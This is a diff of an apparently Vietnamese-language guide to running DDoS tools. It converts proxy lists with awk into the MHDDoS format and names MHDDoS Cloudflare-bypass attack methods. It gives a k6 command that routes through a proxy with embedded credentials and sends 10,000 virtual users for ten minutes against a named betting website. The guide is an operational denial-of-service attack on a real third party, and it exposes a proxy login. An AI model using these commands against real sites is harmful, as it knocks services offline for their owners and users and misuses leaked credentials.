@@ -15,20 +15,20 @@ awk -F: '{print "http://" $3 ":" $4 "@" $1 ":" $2}' proxies_input.txt > proxies_
 mv proxies_tmp.txt proxies_input.txt`
 ```
 
-### 🧩 Chuyển sang định dạng phù hợp với **MHDDoS**:
+### 🧩 Chuyển sang định dạng phù hợp với **MHDDoS**: 
 
 ```bash
 awk '
 /@/ {
-match($0, /http:\/\/([^:]+):([^@]+)@([^:]+):([0-9]+)/, arr)
-if (arr[1] && arr[2] && arr[3] && arr[4]) {
-print "http://" arr[3] ":" arr[4] ":" arr[1] ":" arr[2]
-} else {
-print "# Lỗi: " $0
+  match($0, /http:\/\/([^:]+):([^@]+)@([^:]+):([0-9]+)/, arr)
+  if (arr[1] && arr[2] && arr[3] && arr[4]) {
+    print "http://" arr[3] ":" arr[4] ":" arr[1] ":" arr[2]
+  } else {
+    print "# Lỗi: " $0
+  }
 }
-}
-/@/! {
-print $0
+!/@/ {
+  print $0
 }
 ' proxies.txt > proxies_fixed.txt
 mv proxies_fixed.txt proxies.txt
@@ -66,7 +66,7 @@ mv proxies_live.txt proxies.txt
 
 ---
 
-## 5️⃣ 🧨 MHDDoS
+## 5️⃣ 🧨 MHDDoS ( CFB, CFBUAM, BYPASS, KILLER, APACHE)
 
 📁 Chuyển thư mục:
 ```bash
@@ -95,8 +95,7 @@ cd bot`
 
 ```bash
 export HTTP_PROXY="http://ugbp7v4r:uGbP7v4R@103.151.122.165:20211"
-
-k6 run test.js
+k6 run k6.js
 -e BASE_URL="https://sh1bet.live/"\
 -e VUS=10000\
 -e DURATION="10m"
